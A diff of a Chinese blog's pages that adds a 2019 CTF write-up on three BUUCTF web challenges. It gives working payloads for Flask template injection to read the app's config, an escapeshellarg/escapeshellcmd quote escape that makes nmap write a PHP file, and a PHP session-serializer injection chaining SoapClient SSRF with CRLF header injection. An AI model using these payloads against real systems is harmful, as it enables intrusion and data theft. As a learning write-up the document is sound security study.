@@ -7,17 +7,40 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://glotozz.github.io">
-  <title>Tag: cms | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
+  <title>buuctf-wp-3 | 往者不可谏，来者犹可追 | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta property="og:type" content="website">
-<meta property="og:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
-<meta property="og:url" content="https://glotozz.github.io/tags/cms/index.html">
+  <meta name="keywords" content="ctf,wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-wp-3">
+<meta property="og:url" content="https://glotozz.github.io/2019/11/04/buuctf-wp-3/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/uMaBHrZjOlX5iLG.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/J2ApKgSnQqsFiXk.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/RjHKyDb9qWgwEMI.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/ZwHAKfBXcGslCbJ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/4WYZbjrv9VJQsEM.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/eclMPGVrH8AEwUx.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/BU5MYNeaRrmCy2h.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/1DbYlQxpTfmyzkB.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/MwHd9nv2ZERxIU3.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/ZxrXDIAkFCW9tdL.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/04/YG5wTHgiEANCvtO.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/ExJklqedmg74iAW.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/uKe1WNHRoSYFBfQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/UOpsmGF3Lywk5MN.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/BF2CLZsNyO3mD54.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/9qTxafCtFdKeusR.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/KVkJh5iDz841GfS.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/ybN9ITWceoAkUxw.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/E4aynCkHsTPDR2X.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/05/w3ls176UmVupWNC.png">
+<meta property="og:updated_time" content="2019-11-05T05:43:46.748Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
+<meta name="twitter:title" content="buuctf-wp-3">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/04/uMaBHrZjOlX5iLG.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -145,147 +168,350 @@
           </div>
           <div id="js-content" class="content-ll">
             
+<article id="post-buuctf-wp-3" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      buuctf-wp-3
+    </h1>
   
+
+        
+        <a href="/2019/11/04/buuctf-wp-3/" class="archive-article-date">
+  	<time datetime="2019-11-04T06:59:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-04</time>
+</a>
+        
+      </header>
     
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><p><img src="https://i.loli.net/2019/11/04/uMaBHrZjOlX5iLG.png" alt="Snipaste_2019-11-04_15-00-26.png"></p>
+<p>很明显是flask模版注入，这里先将传入的字符串的左右括号替换为空，又设置了黑名单<code>config</code>和<code>self</code></p>
+<p>ok,翻翻自己以前的小笔记😁，大致都是如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;d:/1.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p>好像没有绕过()被过滤的。。。。</p>
+<p>那么根据wp学习一波</p>
+<p><strong>方法一、</strong></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>从<code>current_app</code>中可以获取到<code>config</code>的内容，那么我们如何去引用<code>current_app</code>呢？（直接使用是不行的）</p>
+<p><code>url_for</code> 和 <code>get_flashed_messages</code>是flask内置函数，可以通过他们来引用<code>current_app</code></p>
+</blockquote>
+<p>这两个函数是flask内置函数，可以通过它们来引用<code>current_app</code></p>
+<p><strong>方法二、</strong></p>
+<blockquote>
+<p>虽然<code>config</code>和<code>self</code>不能直接获取，但是<code>request</code>是有效的，猜测<code>app.config</code>可以通过<code>request</code>某处引用到，于是写一个搜索脚本（来自ctftime上的wp） </p>
+</blockquote>
+<p>这种方法还不李姐</p>
+<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p><img src="https://i.loli.net/2019/11/04/J2ApKgSnQqsFiXk.png" alt="Snipaste_2019-11-04_15-34-09.png"></p>
+<blockquote>
+<p>nmap -oN选项表示将输出导入到文件中</p>
+</blockquote>
+<p>然后是有两个过滤函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ep = escapeshellarg($param);</span><br><span class="line">$eep = escapeshellcmd($ep);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>escapeshellarg()</code>是首先给传递进来的字符两边加个单引号，如过字符串中包含单引号，先转义，两边再各自添加个单引号。</p>
+<p><code>escapeshellcmd()</code>就是转义危险字符，使得只执行一个命令。</p>
+</blockquote>
+<p><strong>问题出现在<code>escapeshellcmd()</code>，只会转义单个的单引号，不会转义成对的双引号，所以将<code>\</code>转义掉，造成单引号逃逸。</strong></p>
+<p>比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$p = &quot;1&apos;&quot;;</span><br><span class="line">	$p1 = escapeshellarg($p);</span><br><span class="line">	$p2 = escapeshellcmd($p1);</span><br><span class="line">	echo $p1.&quot;\n&quot;;</span><br><span class="line">	echo $p2.&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到，和网上的结果不太一样。。。但是不影响，所有引号都被闭合了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;1&apos;&quot;</span><br><span class="line">\&quot;1\&apos;\&quot;</span><br></pre></td></tr></table></figure>
+
+<p>是因为操作系统的原因。。。。切换到linux下</p>
+<p><img src="https://i.loli.net/2019/11/04/RjHKyDb9qWgwEMI.png" alt="Snipaste_2019-11-04_16-01-48.png"></p>
+<p>所以构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &lt;?php phpinfo();?&gt; -oG shell.php &apos;</span><br></pre></td></tr></table></figure>
+
+<p>某些wp是<code>-oN</code>，似乎不行，会提示</p>
+<p> syntax error, unexpected ‘“.’ (T_CONSTANT_ENCAPSED_STRING)  </p>
+<blockquote>
+<p><code>-oN</code> <strong>(标准输出)</strong> </p>
+<p><code>-oG</code> <strong>(Grep输出)</strong> </p>
+</blockquote>
+<h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><p><code>index.php</code></p>
+<p><img src="https://i.loli.net/2019/11/04/ZwHAKfBXcGslCbJ.png" alt="Snipaste_2019-11-04_16-21-28.png"></p>
+<p>代码很短。还有一个<code>flag.php</code></p>
+<p><img src="https://i.loli.net/2019/11/04/4WYZbjrv9VJQsEM.png" alt="Snipaste_2019-11-04_16-36-15.png"></p>
+<p>需要本地访问， 首先想到的是需要构造<code>SSRF</code>去访问<code>flag.php</code>，然后获取flag。再利用变量覆盖把SESSION中的flag打印出来。 </p>
+<blockquote>
+<p> php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列化之后的内容。 </p>
+</blockquote>
+<p><code>session.serialize_handler</code>存在以下几种 </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过serialize()函数处理过的值</span><br><span class="line">php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure>
+
+<p>通过代码设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;需要设置的引擎&apos;);。</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>php_binary</code></p>
+<p><img src="https://i.loli.net/2019/11/04/eclMPGVrH8AEwUx.png" alt="Snipaste_2019-11-04_18-31-06.png"></p>
+<p><code>php_serialize</code></p>
+<p><img src="https://i.loli.net/2019/11/04/BU5MYNeaRrmCy2h.png" alt="Snipaste_2019-11-04_18-31-31.png"></p>
+<p><code>php_binary</code></p>
+<p><img src="https://i.loli.net/2019/11/04/1DbYlQxpTfmyzkB.png" alt="Snipaste_2019-11-04_18-31-51.png"></p>
+<p><strong>我发现有个小问题，自己windows环境下phpstudy集成环境用php7.3.4时localhost访问只产生sessionid而不产生session文件，而直接运行脚本能产生session文件，后来改用php5.4.45成功（需要配置下<code>session.save_path</code>）</strong></p>
+<p>那么如何利用？参考smi1e师傅举的例子</p>
+<blockquote>
+<p>当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。 例如传入</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;name&apos;]=&apos;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&apos;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>序列化引擎使用的是php_serialize，那么储存的session文件为</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">38</span>:<span class="string">"|O:5:"</span>Smi1e<span class="string">":1:&#123;s:4:"</span>test<span class="string">";s:3:"</span>AAA<span class="string">";&#125;"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>而反序列化引擎如果使用的是php，就会把<code>|</code>作为作为key和value的分隔符。把<code>a:1:{s:4:&quot;name&quot;;s:38:&quot;</code>当作键名，而把<code>O:5:&quot;Smi1e&quot;:1:{s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;}</code>当作经过serialize()函数处理过的值，最后会把它进行<code>unserialize</code>处理，此时就构成了一次反序列化注入攻击。</p>
+</blockquote>
+<p>wp总结的很好👍</p>
+<blockquote>
+<p> <strong>利用回调函数覆盖session序列化引擎为php_serilaze，构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件，然后利用变量覆盖漏洞，覆盖掉变量b为回调函数call_user_func，此时结合我刚开始所说的回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。</strong>  </p>
+</blockquote>
+<p>之前已经接触过<code>Soap</code>类来进行SSRF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $url = &quot;http://127.0.0.1/flag.php&quot;;</span><br><span class="line">    $b = new SoapClient(null, array(&apos;uri&apos; =&gt; $url, &apos;location&apos; =&gt; $url));</span><br><span class="line">    $a = serialize($b);</span><br><span class="line">    $a = str_replace(&apos;^^&apos;, &quot;\r\n&quot;, $a);</span><br><span class="line">    echo &quot;|&quot; . urlencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p><strong>我裂开，仔细比较和wp里面生成的不一样，猜测是因为我是在windows下生成的，那么切换到linux下</strong></p>
+<p>放到kali，脚本一跑提示出错</p>
+<p><img src="https://i.loli.net/2019/11/04/MwHd9nv2ZERxIU3.png" alt="Snipaste_2019-11-04_20-40-37.png"></p>
+<p>在<code>php.ini</code>中开启扩展，再跑一次脚本，又出错</p>
+<p><img src="https://i.loli.net/2019/11/04/ZxrXDIAkFCW9tdL.png" alt="Snipaste_2019-11-04_20-41-33.png"></p>
+<p><code>php -m</code>查看已安装的扩展,果然不存在soap，然后安装有点麻烦，就想先切换到centos7试试，直接就好了。。。。😅</p>
+<p><img src="https://i.loli.net/2019/11/04/YG5wTHgiEANCvtO.png" alt="Snipaste_2019-11-04_22-18-46.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p><strong>。。。。之后在本地调试的时候发现这并不是系统问题，是php版本问题导致的，之前windows下是php7.3.4，kali中也是7.3，centos7下是php5.4</strong></p>
+<blockquote>
+<p><code>php_serialize</code>如您的链接中所述，仅从PHP 5.5.4及更高版本可用。 </p>
+</blockquote>
+<p>我选择了php5.6.9。。。。</p>
+<blockquote>
+<p>覆盖序列化引擎并将构造的Soap类序列化字符串写入session文件。 </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/05/ExJklqedmg74iAW.png" alt="Snipaste_2019-11-05_08-43-23.png"></p>
+<p>本地测试内容如下，还是<code>php</code>引擎</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name|s:181:&quot;|O:10:&quot;SoapClient&quot;:4:&#123;s:3:&quot;uri&quot;;s:3:&quot;123&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:11:&quot;_user_agent&quot;;s:38:&quot;N0rth3ty</span><br><span class="line">Cookie: PHPSESSID=bbbbbbbb</span><br><span class="line">&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此时session_start()序列化使用的是php引擎。 <code>reset($_SESSION)</code>为我们的<code>SoapClient</code>类，接下里我们覆盖变量b，利用<code>call_user_func</code>调用<code>SoapClient</code>类中的不存在方法，触发<code>__call</code>方法，执行ssrf。并获得访问flag.php的PHPSESSID。 </p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/11/05/uKe1WNHRoSYFBfQ.png" alt="Snipaste_2019-11-05_08-44-18.png"></p>
+<p>带上sessionid去访问</p>
+<p><img src="https://i.loli.net/2019/11/05/UOpsmGF3Lywk5MN.png" alt="Snipaste_2019-11-05_08-46-16.png"></p>
+<p><strong>之前自己本地调试失败的原因是第一次存入session文件的引擎仍然为php。。。。</strong></p>
+<p><img src="https://i.loli.net/2019/11/05/BF2CLZsNyO3mD54.png" alt="Snipaste_2019-11-05_12-36-36.png"></p>
+<p>被注释的方法是可以生成<code>php_serialize</code>引擎的，而下面这种却不行。。。。</p>
+<p><img src="https://i.loli.net/2019/11/05/9qTxafCtFdKeusR.png" alt="Snipaste_2019-11-05_12-38-55.png"></p>
+<p>官网查一查，果然不出所料，wdnmd</p>
+<p><img src="https://i.loli.net/2019/11/05/KVkJh5iDz841GfS.png" alt="Snipaste_2019-11-05_12-41-54.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	// ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">	session_start(array(&apos;serialize_handler&apos;=&gt;&apos;php_serialize&apos;));</span><br><span class="line">	$_SESSION[&apos;name&apos;]=&apos;O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A38%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dbbbbbbbb%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:290:&quot;O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A38%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dbbbbbbbb%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功😗</p>
+<p>但是再最后一步又出了问题。。。。。</p>
+<p><img src="https://i.loli.net/2019/11/05/ybN9ITWceoAkUxw.png" alt="Snipaste_2019-11-05_13-14-30.png"></p>
+<p>应该是没有安装soap扩展。。。但是明明已经再<code>php.ini</code>中开启了<code>extension=php_soap.dll</code>。。。。。难道bug了？</p>
+<p><img src="https://i.loli.net/2019/11/05/E4aynCkHsTPDR2X.png" alt="Snipaste_2019-11-05_13-23-55.png"></p>
+<p>找了一下原来是配置没改全。。。</p>
+<p>还有个点<code>flag.php</code>中需要加上<code>session_start()</code>，否则还是不会产生session文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();</span><br><span class="line">	$flag = &quot;flag&#123;hahahah&#125;&quot;;</span><br><span class="line">	if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">	       $_SESSION[&apos;flag&apos;] = $flag;</span><br><span class="line">	   &#125;</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>终于好了。。</p>
+<p><img src="https://i.loli.net/2019/11/05/w3ls176UmVupWNC.png" alt="Snipaste_2019-11-05_13-41-57.png"></p>
+<p>我太南了</p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p> <a href="https://tanpuhan.github.io/2019/09/28/2018TWCTF—shrine/#more" target="_blank" rel="noopener">https://tanpuhan.github.io/2019/09/28/2018TWCTF%E2%80%94shrine/#more</a> </p>
+<p> <a href="https://blog.csdn.net/qq_26406447/article/details/100711933" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/100711933</a> </p>
+<p> <a href="https://cloud.tencent.com/developer/article/1376384" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1376384</a> </p>
+<p> <a href="https://xz.aliyun.com/t/3340" target="_blank" rel="noopener">https://xz.aliyun.com/t/3340</a> </p>
+<p> <a href="https://www.cnblogs.com/20175211lyz/p/11515519.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11515519.html</a> </p>
+
+      
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="https://ws1.sinaimg.cn/large/006Xmmmgly1g5wqd9c77wj309a0980u1.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>作者:  </strong>glotozz</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>文章链接:  </strong>
+          <a href="/2019/11/04/buuctf-wp-3/" target="_blank" title="buuctf-wp-3">https://glotozz.github.io/2019/11/04/buuctf-wp-3/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明:   </strong>
+            本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            许可协议。转载请注明出处!
+          </li>
+        </ul>
+      <div>
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/26/DuomiCMS3-0漏洞复现/" class="archive-article-date">
-  	<time datetime="2019-09-25T22:31:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/26/DuomiCMS3-0漏洞复现/">DuomiCMS3.0漏洞复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cms</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://glotozz.github.io/2019/11/04/buuctf-wp-3/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/24/Dedecms漏洞分析-2/" class="archive-article-date">
-  	<time datetime="2019-09-23T23:24:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/11/03/buuctf-wp-2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">buuctf-wp-2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/24/Dedecms漏洞分析-2/">Dedecms漏洞复现-2</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cms</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/23/Dedecms漏洞分析/" class="archive-article-date">
-  	<time datetime="2019-09-22T23:21:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/23/Dedecms漏洞分析/">Dedecms漏洞复现</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">cms</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
